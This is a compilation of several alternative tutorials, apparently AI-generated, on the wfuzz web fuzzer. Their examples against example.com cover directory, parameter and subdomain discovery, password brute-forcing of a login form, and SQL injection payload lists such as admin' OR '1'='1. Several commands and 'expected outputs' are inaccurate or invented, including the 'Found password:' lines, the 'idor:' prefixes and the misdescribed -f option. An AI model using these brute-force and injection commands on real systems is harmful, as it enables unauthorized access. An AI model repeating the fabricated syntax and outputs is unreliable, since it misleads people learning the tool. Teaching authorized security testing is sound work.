# wfuzz
WFuzz is a powerful web application fuzzer included in Kali Linux, primarily used for discovering vulnerabilities by brute-forcing web applications. It allows users to send multiple requests to a target URL, replacing specific placeholders with entries from a wordlist.

### Installation

WFuzz is usually pre-installed in Kali Linux. If it is not available, you can install it using:

```bash
sudo apt update
sudo apt install wfuzz
```

### Basic Usage

The basic syntax for using WFuzz is:

```bash
wfuzz -c -z <type>:<wordlist> -u <url>
```

- `-c`: Enables colored output for better readability.
- `-z <type>:<wordlist>`: Indicates the fuzzing type and the path to the wordlist.
- `-u <url>`: The target URL with a placeholder (e.g., `FUZZ`) for fuzzing.

### Examples

#### Example 1: Basic Directory Fuzzing

To find hidden directories on a website:

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -u http://example.com/FUZZ
```

**Expected Output:**

```
[200] http://example.com/admin/ [Size: 2345]
[403] http://example.com/private/ [Size: 0]
```

This output indicates that the `/admin/` directory is accessible, while the `/private/` directory returns a forbidden status.

#### Example 2: Fuzzing with Multiple Payloads

To test multiple payloads at once, you can use multiple `-z` options:

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -z file,/usr/share/wordlists/parameters.txt -u http://example.com/FUZZ?param=FUZZ
```

**Expected Output:**

```
[200] http://example.com/index.php?param=value1 [Size: 1234]
[404] http://example.com/index.php?param=notfound [Size: 0]
```

#### Example 3: Fuzzing POST Requests

To fuzz POST parameters, use the `-X POST` option along with `-d` to specify the data:

```bash
wfuzz -c -z file,/usr/share/wordlists/passwords.txt -u http://example.com/login -X POST -d "username=admin&password=FUZZ"
```

**Expected Output:**

```
[200] http://example.com/login [Size: 5678] Found password: admin123
```

#### Example 4: Filtering by Status Code

You can filter results based on HTTP status codes using the `--fc` option:

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -u http://example.com/FUZZ --fc 404
```

This command will only show results that do not return a 404 status.

### Conclusion

WFuzz is a versatile tool for web application testing, allowing for effective brute-forcing of directories, files, and parameters. It provides various options for customization, making it suitable for penetration testers and security researchers. Always ensure you have permission to perform fuzzing on the target application to avoid legal issues.



                               ALTERNATIVE
WFuzz is a flexible and powerful web application fuzzer included in Kali Linux, primarily used for discovering hidden resources, vulnerabilities, and parameters in web applications.

### Installation

WFuzz is usually pre-installed in Kali Linux. If it’s not available, you can install it using:

```bash
sudo apt update
sudo apt install wfuzz
```

### Basic Usage

The basic syntax for using WFuzz is:

```bash
wfuzz -c -w <wordlist> -u <url>
```

- `-c`: Enables colored output for better readability.
- `-w <wordlist>`: The path to the wordlist to use for fuzzing.
- `-u <url>`: The target URL, with `FUZZ` as a placeholder where the wordlist entries will be inserted.

### Examples

#### Example 1: Basic Directory Fuzzing

To discover hidden directories on a website:

```bash
wfuzz -c -w /usr/share/wordlists/dirb/common.txt -u http://example.com/FUZZ
```

**Expected Output:**

```
[200]    http://example.com/admin/       [Size: 1234]
[403]    http://example.com/private/     [Size: 456]
```

This output shows that the `/admin/` directory is accessible (HTTP 200), while the `/private/` directory returns a forbidden status (HTTP 403).

#### Example 2: Fuzzing with Parameters

To test for vulnerabilities in a query string:

```bash
wfuzz -c -w /usr/share/wordlists/sqli.txt -u "http://example.com/page.php?id=FUZZ"
```

**Expected Output:**

```
[200]    http://example.com/page.php?id=1        [Size: 1234]
[500]    http://example.com/page.php?id=1'       [Size: 0]
```

This output indicates that the input `1'` triggered a server error (HTTP 500), which may suggest a SQL injection vulnerability.

#### Example 3: Fuzzing POST Requests

To fuzz parameters in a POST request:

```bash
wfuzz -c -w /usr/share/wordlists/passwords.txt -u http://example.com/login -d "username=admin&password=FUZZ"
```

**Expected Output:**

```
[200]    http://example.com/login              [Size: 1234]  Found password: password123
```

This result indicates that the password `password123` was accepted for the username `admin`.

#### Example 4: Using Multiple Wordlists

You can provide multiple wordlists to target different parts of the URL:

```bash
wfuzz -c -w /usr/share/wordlists/dirb/common.txt -w /usr/share/wordlists/params.txt -u "http://example.com/FUZZ?param=FUZZ"
```

**Expected Output:**

```
[200]    http://example.com/admin?param=value   [Size: 1234]
[403]    http://example.com/private?param=value [Size: 456]
```

This output shows successful hits for different combinations of directories and parameters.

### Conclusion

WFuzz is a robust tool for web application testing, allowing users to discover hidden resources and test for vulnerabilities effectively. Its flexibility with wordlists and options makes it a valuable asset for penetration testers.

Always ensure you have permission to test the target application to avoid legal issues.




                             ALTERNATIVE
Understood. Here is how to use the wfuzz tool in Kali Linux, along with examples and expected outputs:

### What is wfuzz?

Wfuzz is a web application security scanning tool used for web application fuzzing. It can be used to discover hidden web pages, parameters, and other information about a web application.

### Installation

Wfuzz is typically pre-installed in Kali Linux. If it's not installed, you can install it using the following command:

```bash
sudo apt update
sudo apt install wfuzz
```

### Basic Usage

The basic syntax for using wfuzz is:

```bash
wfuzz -c -z file,<wordlist> -u <url>
```

- `-c`: Enables colored output.
- `-z file,<wordlist>`: Specifies the wordlist to use.
- `-u <url>`: The target URL, with a placeholder for the part you want to fuzz.

### Examples

#### Example 1: Fuzzing Directories

To discover hidden directories on a website:

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt -u http://example.com/FUZZ
```

**Expected Output:**

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                        *
********************************************************

Target: http://example.com/FUZZ
Total requests: 4613

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=301        9 L        28 W        321 Ch        "admin"
000002:  C=301        9 L        28 W        321 Ch        "css"
000003:  C=200      111 L       100 W       1111 Ch        "index.php"
000004:  C=200         2 L         2 W         17 Ch        "robots.txt"
```

This output shows that the `/admin`, `/css`, `/index.php`, and `/robots.txt` directories were discovered on the target website.

#### Example 2: Fuzzing Parameters

To discover hidden parameters in a web application:

```bash
wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/megabeast.txt -u http://example.com/login.php?FUZZ=value
```

**Expected Output:**

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                        *
********************************************************

Target: http://example.com/login.php?FUZZ=value
Total requests: 9713

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=200       50 L       200 W       1234 Ch        "username"
000002:  C=200       50 L       200 W       1234 Ch        "password"
000003:  C=200       50 L       200 W       1234 Ch        "email"
```

This output shows that the `username`, `password`, and `email` parameters were discovered on the `/login.php` page.

#### Example 3: Fuzzing Subdomains

To discover subdomains of a website:

```bash
wfuzz -c -z file,/usr/share/wordlists/subdomains-top1million-5000.txt -u http://FUZZ.example.com
```

**Expected Output:**

```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                        *
********************************************************

Target: http://FUZZ.example.com
Total requests: 5000

==================================================================
ID      Response   Lines      Word         Chars          Payload
==================================================================

000001:  C=200      100 L       500 W       3456 Ch        "www"
000002:  C=200       75 L       350 W       2345 Ch        "blog"
```

This output shows that the `www.example.com` and `blog.example.com` subdomains were discovered.

### Additional Features

Wfuzz provides many additional options and features, including:

- `-z` to specify multiple wordlists
- `-H` to add custom headers
- `-d` to send data in POST requests
- `-f` to save the output to a file
- `-v` for verbose output
- `-t` to set the number of concurrent threads

You can explore these options in the wfuzz documentation to customize your scans.

Remember to always use wfuzz (and any web scanning tool) responsibly and with permission, as unauthorized scanning can be considered illegal in some jurisdictions.


                            ALTERNATIVE
WFUZZ is another powerful web fuzzer tool in Kali Linux. Here's how it's used, along with examples and expected outputs:

**Installation**

WFUZZ is pre-installed in Kali Linux. If not, you can install it using:
```bash
sudo apt update
sudo apt install wfuzz
```
**Basic Usage**

The basic syntax for using WFUZZ is:
```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://example.com/FUZZ
```
* `-c` : Colorize output
* `-z file,/usr/share/wordlists/dirb/common.txt` : Specify the wordlist file
* `http://example.com/FUZZ` : The target URL with the FUZZ placeholder

**Examples and Output**

1. **Directory Discovery**

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://example.com/FUZZ
```
**Expected Output:**
```
idor: [200] [Size: 1234] /admin/
idor: [403] [Size: 456] /private/
```
This output shows that the `/admin/` directory is accessible (HTTP 200), while the `/private/` directory returns a forbidden status (HTTP 403).

2. **Fuzzing File Extensions**

```bash
wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://example.com/FUZZ.php
```
**Expected Output:**
```
idor: [200] [Size: 567] /index.php
idor: [404] [Size: 0] /notfound.html
```
This shows that the `index.php` file exists, while `notfound.html` does not.

3. **Fuzzing POST Requests**

```bash
wfuzz -c -z file,/usr/share/wordlists/passwords.txt -d "username=admin&password=FUZZ" http://example.com/login
```
**Expected Output:**
```
idor: [200] [Size: 1234] Found password: password123
```
This indicates that the password `password123` was successful for the username `admin`.

**Tips and Variations**

* Use `-t` to specify the number of threads.
* Use `-v` for verbose output.
* Use `-o` to save the output to a file.
* Use `-f` to specify a filter for the output (e.g., `-f "http.status_code=200"`).
* WFUZZ supports multiple wordlists and can be used for fuzzing parameters, headers, and more.

Remember to always use WFUZZ responsibly and with permission from the target system's owner.


                                ALTERNATIVE
`wfuzz` is a web application fuzzer primarily used for identifying vulnerabilities by injecting various inputs into web applications. It's a versatile tool for tasks like finding SQL injection flaws, cross-site scripting vulnerabilities, and more.

### Installation

`wfuzz` is typically pre-installed in Kali Linux. If it's not available, you can install it using:

```bash
sudo apt update
sudo apt install wfuzz
```

### Basic Usage

The basic syntax for using `wfuzz` is:

```bash
wfuzz -w <wordlist> <options> <url>
```

*   `-w <wordlist>`: Path to the wordlist file.
*   `<options>`: Various options to customize the scan.
*   `<url>`: The target URL, using `FUZZ` as a placeholder for fuzzing.

### Options

*   `-c`: Colored output.
*   `-z payload,wordlist`: Defines a payload using a wordlist.
*   `-b cookie`: Add a cookie to the requests.
*   `-H header`: Add a custom header to the requests.
*   `--hc <codes>`: Hide specific HTTP status codes from the results (e.g., `--hc 404`).
*   `--hl <lines>`: Hide responses with a specific number of lines.
*   `--hw <words>`: Hide responses with a specific number of words.
*   `--hs <size>`: Hide responses with a specific size.
*   `-p proxy`: Use a proxy for the requests.
*   `-t threads`: Number of concurrent threads.
*   `-o output_file`: Save the output to a file.

### Examples and Output

1.  **Basic Directory Fuzzing**

    ```bash
    wfuzz -w /usr/share/wordlists/dirb/common.txt http://example.com/FUZZ
    ```

    **Example Output:**

    ```
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************
    
    Target: http://example.com/FUZZ
    Total requests: 4612
    
    
    ID   Response   Lines    Word       Chars       Request
    =====================================================================
    000009: C=200      11       28         287       "index.html"
    000023: C=301      9        17         256       "images"
    000031: C=200      32       100        1234      "robots.txt"
    ```

    This output shows the discovered files and directories, along with their HTTP status codes, number of lines, words, and characters.
2.  **Fuzzing for GET Parameters**

    ```bash
    wfuzz -z file,/usr/share/wordlists/wfuzz/general/common.txt -u "http://example.com/index.php?FUZZ=value"
    ```

    **Example Output:**

    ```
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************
    
    Target: http://example.com/index.php?FUZZ=value
    Total requests: 664
    
    
    ID   Response   Lines    Word       Chars       Request
    =====================================================================
    000011: C=200      45       150        1678      "id"
    000022: C=200      45       150        1678      "name"
    000033: C=200      45       150        1678      "search"
    ```

    This output shows potential GET parameters the application uses.
3.  **Fuzzing POST Requests**

    ```bash
    wfuzz -z file,/usr/share/wordlists/wfuzz/general/common.txt -d "username=admin&password=FUZZ" http://example.com/login.php
    ```

    **Example Output:**

    ```
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************
    
    Target: http://example.com/login.php
    Total requests: 664
    
    
    ID   Response   Lines    Word       Chars       Request
    =====================================================================
    000123: C=200      12       34         456       "password123"
    000234: C=200      12       34         456       "secret"
    ```

    This reveals potential passwords that result in a successful login (HTTP 200).
4.  **Header Fuzzing**

    ```bash
    wfuzz -H "X-Custom-Header: FUZZ" -w /usr/share/wordlists/wfuzz/general/common.txt http://example.com
    ```

    **Example Output:**

    ```
    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************
    
    Target: http://example.com
    Total requests: 664
    
    
    ID   Response   Lines    Word       Chars       Request
    =====================================================================
    000345: C=200      45       150        1678      "admin"
    000456: C=200      45       150        1678      "debug"
    ```

    This identifies custom header values that might influence the application's behavior.
5.  **Filtering Results**

    ```bash
    wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 http://example.com/FUZZ
    ```

    This command hides all 404 (Not Found) responses, making it easier to focus on valid resources.
6.  **Using Payloads**

    ```bash
    wfuzz -c -z file,/usr/share/wordlists/wfuzz/SQLi/SQLi-LFI.txt -u "http://example.com/index.php?id=FUZZ"
    ```

    This command uses a wordlist of SQL injection and Local File Inclusion (LFI) payloads to test the `id` parameter in `index.php`.

### Notes

*   Always ensure you have explicit permission to test a target.
*   Be mindful of the number of threads to avoid overwhelming the target server.
*   The quality of the wordlist significantly impacts the effectiveness of `wfuzz`.
*   Carefully analyze the results to identify potential vulnerabilities.


                                          ALTERNATIVE
Wfuzz is a powerful web application fuzzer included in Kali Linux, designed for discovering vulnerabilities in web applications by sending various payloads to the target URL. It can be used for tasks such as brute-forcing directories, files, and parameters, as well as testing for common web vulnerabilities like SQL injection and XSS.

### How to Use Wfuzz

1. **Installation**: Wfuzz is typically pre-installed in Kali Linux. If you need to install it, you can do so with the following command:
   ```bash
   sudo apt install wfuzz
   ```

2. **Basic Syntax**:
   The basic command structure for using Wfuzz is:
   ```bash
   wfuzz -u <target_url> -z <payload>
   ```
   - `-u <target_url>`: The URL you want to fuzz, with `FUZZ` as a placeholder for the payload.
   - `-z <payload>`: The payload to use, which can be a wordlist or other types of data.

### Examples and Expected Output

#### Example 1: Directory Fuzzing

To fuzz for hidden directories on a website, you can use a command like this:

```bash
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://example.com/FUZZ
```

**Expected Output**:
```
********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer *
********************************************************
Target: http://example.com/FUZZ
Payload type: file,/usr/share/wfuzz/wordlist/general/common.txt
Total requests: 950
==================================================================
ID Response Lines Word Chars Request
==================================================================
00429: C=200 4 L 25 W 177 Ch " - index"
00466: C=301 9 L 28 W 319 Ch " - javascript"
```
This output indicates that the `/index` directory returned a 200 OK status, while another entry returned a 301 redirect [[1]](https://www.kali.org/tools/wfuzz/).

#### Example 2: Brute-Forcing Authentication

To brute-force a login form, you can use:

```bash
wfuzz -w usernames.txt -w passwords.txt --basic FUZZ:FUZ2Z http://example.com/login
```

**Expected Output**:
```
********************************************************
* Wfuzz 2.4.6 - The Web Fuzzer *
********************************************************
Target: http://example.com/login
Total requests: 6
========================================================================
ID Response Lines Word Chars Payload
========================================================================
000000002: 200 20 L 2904 W 227381 Ch "admin:password"
000000001: 404 46 L 120 W 1256 Ch "admin:wrongpass"
```
This shows that the combination `admin:password` was successful, returning a 200 status code [[2]](https://www.techtarget.com/searchsecurity/feature/How-to-use-Wfuzz-to-find-web-application-vulnerabilities).

#### Example 3: Testing for SQL Injection

To test for SQL injection vulnerabilities, you can use:

```bash
wfuzz -c -z file,/usr/share/wfuzz/Injections/SQL.txt -d "username=admin&password=FUZZ" -u http://example.com/login
```

**Expected Output**:
```
********************************************************
* Wfuzz 2.4.6 - The Web Fuzzer *
********************************************************
Target: http://example.com/login
Total requests: 10
========================================================================
ID Response Lines Word Chars Payload
========================================================================
000000003: 200 20 L 2904 W 227381 Ch "admin' OR '1'='1"
```
This indicates that the SQL injection payload `admin' OR '1'='1'` was successful, returning a 200 status code [[3]](https://scottc130.medium.com/how-to-use-wfuzz-to-fuzz-web-applications-8594c11d59d1).

### Conclusion

Wfuzz is a versatile tool for web application testing, allowing users to automate the discovery of vulnerabilities efficiently. By using various payloads and options, it can help identify security weaknesses in web applications.

---
Learn more:
1. [wfuzz | Kali Linux Tools](https://www.kali.org/tools/wfuzz/)
2. [How to use Wfuzz to find web application vulnerabilities | TechTarget](https://www.techtarget.com/searchsecurity/feature/How-to-use-Wfuzz-to-find-web-application-vulnerabilities)
3. [How to use Wfuzz to Fuzz Web Applications | by Scott Cosentino | Medium](https://scottc130.medium.com/how-to-use-wfuzz-to-fuzz-web-applications-8594c11d59d1)

                                        
